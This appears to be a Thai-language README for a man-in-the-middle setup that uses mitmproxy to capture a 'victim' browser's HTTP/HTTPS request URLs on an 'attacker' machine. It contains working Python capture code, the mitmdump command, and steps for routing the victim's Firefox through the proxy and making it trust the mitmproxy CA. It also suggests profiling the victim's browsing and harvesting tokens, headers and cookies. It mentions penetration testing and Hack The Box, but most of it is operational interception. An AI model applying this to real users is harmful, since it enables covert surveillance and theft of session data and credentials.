# 🚀 MITM Proxy URL Capture (mitmproxy) - คู่มือฉบับละเอียด

## 🔹 บทนำ
โปรเจกต์นี้ใช้ **mitmproxy** เพื่อดักจับ **HTTP/HTTPS traffic ของเหยื่อ (ejb)** ผ่าน proxy ของเครื่องโจมตี (MAX) และบันทึก **URL ของทุก request** ลงไฟล์ `captured_urls.txt`  

**ประโยชน์หลัก:**
- วิเคราะห์พฤติกรรมผู้ใช้  
- เก็บข้อมูลสำหรับ security testing หรือ penetration testing  
- ใช้สร้าง report, visualization หรือ dataset สำหรับ automation  

---

## 🔹 Flow การทำงาน

```text
[เหยื่อ (ejb)]
       │
       │ HTTP/HTTPS Request ผ่าน Proxy 8080
       ▼
[เครื่องโจมตี (MAX)]
  ┌───────────────┐
  │ mitmdump      │
  │ + capture.py  │
  └───────────────┘
       │
 ┌─────┴─────┐
 │ Print URL │
 │ Append to │
 │ captured_ │
 │ urls.txt  │
 └───────────┘


อธิบาย:
เหยื่อเชื่อมต่อเว็บใด ๆ → request วิ่งผ่าน proxy ของ MAX
mitmdump + script capture.py จะดัก request
URL ของทุก request ถูก แสดงบน terminal และ บันทึกลงไฟล์



ติดตั้ง mitmproxy
บนเครื่องโจมตี 
sudo apt update
sudo apt install mitmproxy -y



สร้างไฟล์ capture.py:
nano ~/capture.py
ใส่โค้ด:
from mitmproxy import http
import os
from datetime import datetime

output_file = os.path.expanduser("~/captured_urls.txt")

def request(flow: http.HTTPFlow) -> None:
    url = flow.request.pretty_url
    method = flow.request.method
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {method} {url}\n"

    # แสดง URL บน terminal
    print(line, end="")

    # append ลงไฟล์
    with open(output_file, "a") as f:
        f.write(line)



รัน mitmdump พร้อม script
mitmdump -p 8080 -s ~/capture.py
-p 8080 → port ของ proxy
-s ~/capture.py → โหลด script ดัก URL

ตัวอย่าง Terminal ขณะรัน:
[05:12:02] client connect
URL: [2025-08-16 05:12:02] GET https://zap.hackthebox.com/pusher/app/...



4. ตั้งค่า Proxy บนเหยื่อ (ejb)
Firefox → Preferences → Network Settings → Manual proxy configuration
ตั้งค่า:
HTTP Proxy: <IP MAX> Port: 8080
HTTPS Proxy: <IP MAX> Port: 8080
ติ๊ก Use this proxy for all protocols



 5. ติดตั้ง Certificate ของ mitmproxy
ดาวน์โหลด cert บน MAX:
mitmproxy --export-cert ~/mitmproxy-ca-cert.pem

บน Firefox ของเหยื่อ:
Preferences → Privacy & Security → View Certificates → Import
เลือก mitmproxy-ca-cert.pem
ติ๊ก Trust this CA to identify websites → OK
** ขั้นตอนนี้สำคัญ หากไม่ติดตั้ง cert → HTTPS traffic จะไม่ผ่าน proxy



 6. ตรวจสอบผลการดัก URL
เปิดเว็บใด ๆ บนเหยื่อ → request จะผ่าน mitmproxy
บน MAX terminal → URL print แบบ real-time
ตรวจสอบไฟล์ URL:
ls -l ~/captured_urls.txt
tail -f ~/captured_urls.txt
ตัวอย่าง output captured_urls.txt:
[2025-08-16 05:37:12] GET https://www.instagram.com/ajax/bz?__a=1...
[2025-08-16 05:37:15] GET https://th.linkedin.com/li/track



7. การใช้ captured_urls.txt
วิเคราะห์พฤติกรรมเหยื่อ
ดูว่าเข้าเว็บอะไรบ้าง
สร้าง timeline ของกิจกรรม
สร้าง dataset / automation
ดัก URL ของ domain ที่สนใจ → ทำ script อัตโนมัติ
ตรวจสอบ query parameter หรือ token
Filter / categorize
cat captured_urls.txt | grep hackthebox
Visualization & Reporting
สร้างกราฟ domain ที่เข้าเยอะสุด
วิเคราะห์ traffic patterns
Forensics / Logging
บันทึกเป็นหลักฐานกิจกรรมเครือข่าย



8. Tips & Tricks
Filter domain เฉพาะที่สนใจ:
if "hackthebox.com" in url:
    with open(output_file, "a") as f:
        f.write(line)
เพิ่ม headers หรือ cookies ลงใน log เพื่อวิเคราะห์ลึกขึ้น
ใช้ tail -f captured_urls.txt | grep <domain> → ดูแบบ real-time



[เหยื่อ ()]
       │
       │ HTTP/HTTPS Request ผ่าน Proxy 8080
       ▼
[เครื่องโจมตี ()]
  ┌───────────────┐
  │ mitmdump      │
  │ + capture.py  │
  └───────────────┘
       │
 ┌─────┴─────┐
 │ Print URL │
 │ Append to │
 │ captured_ │
 │ urls.txt  │
 └───────────┘
       │
       ▼
[วิเคราะห์ / report / visualization / automation]


10. แนะนำเพิ่มเติม
ทำ script แยก log ตาม IP ของเหยื่อ → ใช้งานหลายเครื่องพร้อมกันได้
เพิ่ม timestamp + method + domain filtering → วิเคราะห์ง่ายขึ้น
สร้าง dashboard visualization แบบ real-time ด้วย Python + matplotlib / Plotly



 11. สรุป
ตอนนี้คุณสามารถ:
รัน mitmproxy ดักจับ traffic ของเหยื่อ
แสดง URL แบบ real-time บน terminal
บันทึก URL ลงไฟล์ captured_urls.txt พร้อม timestamp และ HTTP method
วิเคราะห์พฤติกรรม, สร้าง report, ทำ automation หรือ visualization
ระบบพร้อมใช้งานเต็มที่สำหรับ การวิเคราะห์ traffic ของเหยื่อ ✅













